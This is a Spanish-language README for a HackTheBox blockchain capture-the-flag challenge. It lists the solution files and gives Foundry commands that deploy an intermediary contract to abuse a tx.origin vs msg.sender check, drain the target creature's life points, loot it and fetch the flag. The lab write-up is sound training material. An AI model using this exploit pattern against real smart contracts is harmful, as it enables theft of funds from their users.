# HackTheBox - Distract and Destroy

## Estado del Reto

✅ **ANÁLISIS COMPLETO**
✅ **EXPLOIT DESARROLLADO**  
✅ **DOCUMENTACIÓN CREADA**
⚠️ **INSTANCIA EXPIRADA** (necesita reiniciarse para ejecutar)

## Archivos Importantes

- `SOLUTION_SUMMARY.md` - Explicación completa de la vulnerabilidad y solución
- `exploit.py` - Script Python automatizado para resolver el reto
- `blockchain_distract_and_destroy/src/Attacker.sol` - Contrato exploit
- `connection_details.txt` - Información de conexión (cuando la instancia esté activa)
- `exploit_plan.md` - Plan de ataque detallado

## Ejecución Rápida

### Cuando inicies una nueva instancia:

1. **Obtener nueva información de conexión:**
```bash
curl http://IP:PORT/connection_info | python3 -m json.tool > new_connection.json
```

2. **Actualizar variables en exploit.py** con los nuevos valores

3. **Ejecutar exploit:**
```bash
python3 exploit.py
```

O manualmente con Foundry:

```bash
# Exportar variables
export RPC_URL="http://IP:PORT/rpc"
export PRIVATE_KEY="0x..."
export TARGET="0x..."
export SETUP="0x..."

# Verificar estado inicial
cast call $TARGET "lifePoints()" --rpc-url $RPC_URL
cast call $TARGET "aggro()" --rpc-url $RPC_URL

# Desplegar Attacker
cd blockchain_distract_and_destroy
ATTACKER=$(forge create src/Attacker.sol:Attacker \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY \
  --constructor-args $TARGET \
  --json | jq -r '.deployedTo')

# Establecer aggro
cast send $TARGET "attack(uint256)" 0 --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# Atacar a través del contrato
cast send $ATTACKER "attackCreature(uint256)" 1000 --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# Verificar daño
cast call $TARGET "lifePoints()" --rpc-url $RPC_URL

# Saquear
cast send $TARGET "loot()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# Verificar solución
cast call $SETUP "isSolved()" --rpc-url $RPC_URL

# Obtener flag
curl http://IP:PORT/flag
```

## Vulnerabilidad

**tx.origin vs msg.sender abuse**: El contrato Creature usa `tx.origin != msg.sender` para verificar si el atacante está "off balance", pero esto puede explotarse usando un contrato intermediario.

Ver `SOLUTION_SUMMARY.md` para más detalles.

## Herramientas Instaladas

✅ megatools
✅ netcat-openbsd
✅ nmap
✅ pwntools
✅ web3.py
✅ Foundry (forge, cast, anvil, chisel)

## Limpieza

Para desinstalar todo lo relacionado con este reto:
```bash
# Desinstalar paquetes
sudo apt-get remove --purge megatools netcat-openbsd nmap python3-pip
sudo pip3 uninstall pwntools web3 -y

# Remover Foundry
rm -rf ~/.foundry
sed -i '/foundryup/d' ~/.bashrc

# Borrar directorio del reto
cd /workspace
rm -rf htb_distract_destroy

# Limpiar dependencias
sudo apt-get autoremove -y
sudo apt-get autoclean
```
